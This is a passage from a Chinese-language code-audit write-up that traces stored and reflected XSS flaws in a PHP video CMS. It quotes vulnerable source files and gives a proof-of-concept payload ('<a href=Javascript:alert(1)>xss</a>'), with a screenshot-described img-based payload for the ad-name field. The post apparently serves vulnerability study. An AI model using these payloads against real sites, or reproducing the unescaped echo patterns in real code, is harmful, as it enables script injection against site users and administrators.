class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"><span class=\"token function\">uaredirect</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">echo</span> <span class=\"token variable\">$xtcms_domain</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span>wap/<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">echo</span> <span class=\"token variable\">$tiaourl</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span>\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\t <span class=\"token punctuation\">&#125;</span> <span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>此时发现可控变量<code>play</code>，如果让他变为xss恶意语句，就可能会实现xss，但我们这个时候看一下最上面，发现有一个if语句</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$xtcms_pc</span><span class=\"token operator\">==</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>它这个条件为true后执行的语句，不仔细看的话甚至都找不到结尾处在哪，经过仔细查看后发现在最后<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151202.png\" alt=\"在这里插入图片描述\"><br>这里的话也就是说，我们只有满足了<code>$xtcms_pc==1</code>这个条件，才能够成功的往下执行，进而利用<code>play</code>参数构造xss语句，因此我们此时就需要跟进这个<code>$xtcms_pc</code>变量，全局搜索一下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151222.png\" alt=\"在这里插入图片描述\"><br>发现变量赋值点，跟进查看<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151256.png\" alt=\"在这里插入图片描述\"><br>简单看一下这里的代码，发现这个结果是从SQL查询处的结果取出的，而SQL语句不存在变量，因此这里的话我们是不可控的，所以这里的话应该是不存在XSS的，G</p>\n<h3 id=\"admin-cms-ad-php\"><a href=\"#admin-cms-ad-php\" class=\"headerlink\" title=\"admin/cms_ad.php\"></a>admin/cms_ad.php</h3><p>登录后台后发现有个广告管理界面<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151337.png\" alt=\"在这里插入图片描述\"><br>发现这里可以设置名称和广告内容，尝试在名称处插入xss语句<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151560.png\" alt=\"在这里插入图片描述\"><br>发现此时成功触发了xss语句，那么这里的话应该是直接将广告名称进行了输出，我们查看后端代码，验证一下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'../system/inc.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'cms_check.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'model/ad.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span>\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'inc_header.php'</span><span class=\"token punctuation\">)</span> <span class=\"token delimiter important\">?></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>tab-pane1<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>row<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>col-sm-12<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>form-group has-feedback<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>label</span> <span class=\"token attr-name\">for</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>name-w1<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>名称<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>label</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>l_name<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>form-control<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>title<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">size</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>60<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">data-validate</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>required:请填写广告名称<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>span</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>help-block<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>请输入广告名称<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>span</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>row<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>col-sm-12<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>form-group<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>label</span> <span class=\"token attr-name\">for</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>ccnumber-w1<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>内容<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>label</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>textarea</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>l_picture<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>form-control<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>pic<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>textarea</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>span</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>help-block<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>请输入广告的内容<span class=\"token entity named-entity\" title=\"&lt;\">&amp;lt;</span>a href=\"网址\" target=\"_blank\"<span class=\"token entity named-entity\" title=\"&gt;\">&amp;gt;</span><span class=\"token entity named-entity\" title=\"&lt;\">&amp;lt;</span>img src=\"图片地址\" style=\"width:100%\"<span class=\"token entity named-entity\" title=\"&gt;\">&amp;gt;</span><span class=\"token entity named-entity\" title=\"&lt;\">&amp;lt;</span>/a<span class=\"token entity named-entity\" title=\"&gt;\">&amp;gt;</span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>span</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>row<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>form-group col-sm-12<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>label</span> <span class=\"token attr-name\">for</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>ccmonth-w1<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>广告位置<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>label</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>select</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>catid<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>form-control<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>catid<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'select * from xtcms_adclass'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$row1</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_fetch_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token delimiter important\">?></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>option</span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">echo</span> <span class=\"token variable\">$row1</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token delimiter important\">?></span></span><span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">echo</span> <span class=\"token variable\">$row1</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token delimiter important\">?></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>option</span><span class=\"token punctuation\">></span></span>\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>后端名称处代码为</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span>input id<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"l_name\"</span> <span class=\"token keyword\">class</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"form-control\"</span> name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"title\"</span> type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"text\"</span> size<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"60\"</span> data<span class=\"token operator\">-</span>validate<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"required:请填写广告名称\"</span> value<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"\"</span> <span class=\"token operator\">/</span><span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>可以发现这里只是限制了长度为<code>60</code>，其他没有什么限制，输出广告内容的代码是</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">$result = mysql_query('select * from xtcms_ad order by id desc');\nwhile($row = mysql_fetch_array($result))&#123;\n?><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>tr</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>td</span><span class=\"token punctuation\">></span></span><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">echo</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token delimiter important\">?></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>td</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>td</span><span class=\"token punctuation\">></span></span><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">echo</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'title'</span><span class=\"token punctuation\">]</span><span class=\"token delimiter important\">?></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>td</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里的话是取出结果，然后将结果赋值给<code>$row</code>，最后输出了<code>$row[&#39;id&#39;]</code>和<code>$row[&#39;name&#39;]</code>，正如同所说的一样，不存在过滤点，因而导致了XSS的出现<br>而你此时大概看一下代码的话，它的内容也是如此，内容是在加载页面的时候出现的，这个时候我们可以用<code>img</code>来构造一个xss恶意语句<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151636.png\" alt=\"在这里插入图片描述\"><br>此时随便访问首页的一个视频<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151690.png\" alt=\"在这里插入图片描述\"><br>成功触发XSS</p>\n<h3 id=\"youlian-php\"><a href=\"#youlian-php\" class=\"headerlink\" title=\"youlian.php\"></a>youlian.php</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> \n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'system/inc.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'submit'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token function\">null_back</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'.'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">null_back</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'content'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'你的链接及网站名'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'userid'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'userid'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'content'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span><span class=\"token function\">addslashes</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'content'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'time'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span><span class=\"token function\">date</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'y-m-d h:i:s'</span><span class=\"token punctuation\">,</span><span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\n\t<span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token function\">arrtoinsert</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'insert into xtcms_youlian ('</span><span class=\"token operator\">.</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">') values ('</span><span class=\"token operator\">.</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">')'</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>设置了<code>addslashes</code>函数防止SQL注入，但并未防止XSS，我们构造payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span>a href<span class=\"token operator\">=</span>Javascript<span class=\"token punctuation\">:</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span>xss<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>a<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151720.png\" alt=\"在这里插入图片描述\"><br>后端查看就会发现<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151810.png\" alt=\"在这里插入图片描述\"><br>XSS被触发</p>\n<h3 id=\"admin-cms-kamilist-php\"><a href=\"#admin-cms-kamilist-php\" class=\"headerlink\" title=\"admin/cms_kamilist.php\"></a>admin/cms_kamilist.php</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">//部分源码\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'../system/inc.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'cms_check.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token delimiter important\">?></span></span>\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'inc_header.php'</span><span class=\"token punctuation\">)</span> <span class=\"token delimiter important\">?></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>select</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>form-control<span class=\"token punctuation\">\"</span></span> <span class=\"token special-attr\"><span class=\"token attr-name\">onchange</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value javascript language-javascript\">location<span class=\"token punctuation\">.</span>href<span class=\"token operator\">=</span><span class=\"token string\">'cms_kamilist.php?c_used='</span><span class=\"token operator\">+</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>options<span class=\"token punctuation\">[</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>selectedIndex<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">;</span></span><span class=\"token punctuation\">\"</span></span></span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>option</span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>使用情况<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>option</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>option</span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>1<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">></span></span>已使用<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>option</span><span class=\"token punctuation\">></span></span>\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>option</span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>0<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>未使用<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>option</span><span class=\"token punctuation\">></span></span>\t\t\t\t\t\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>select</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>c_pass<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>form-control<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>c_number<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">placeholder</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>卡密<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">/></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>id<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>input<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>hidden<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>id<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">echo</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"id\"</span><span class=\"token punctuation\">]</span> <span class=\"token delimiter important\">?></span></span><span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">/></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token 